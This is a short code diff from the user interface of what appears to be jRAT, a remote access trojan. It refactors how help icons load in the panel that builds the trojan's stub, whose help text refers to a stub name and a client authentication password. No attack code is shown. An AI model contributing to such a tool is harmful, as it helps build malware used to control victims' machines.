@@ -6,7 +6,6 @@ import java.awt.event.ActionListener;
 import javax.swing.BorderFactory;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
-import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JLabel;
@@ -23,6 +22,7 @@ import se.jrat.client.net.PortListener;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.ui.components.JPlaceholderTextField;
 import se.jrat.client.ui.components.PortListenerJComboBox;
+import se.jrat.client.utils.IconUtils;
 
 
 @SuppressWarnings("serial")
@@ -65,7 +65,7 @@ public class PanelBuildGeneral extends JPanel {
 				Help.help("Name of stub on connect, like \"Brother\"");
 			}
 		});
-		btnHelp.setIcon(new ImageIcon(PanelBuildGeneral.class.getResource("/icons/help.png")));
+		btnHelp.setIcon(IconUtils.getIcon("help"));
 		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
 		gl_panel_1.setHorizontalGroup(
 			gl_panel_1.createParallelGroup(Alignment.LEADING)
@@ -115,7 +115,7 @@ public class PanelBuildGeneral extends JPanel {
 				Help.help("Password to authenticate clients");
 			}
 		});
-		button.setIcon(new ImageIcon(PanelBuildGeneral.class.getResource("/icons/help.png")));
+		button.setIcon(IconUtils.getIcon("help"));
 		setLayout(groupLayout);
 
 		comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
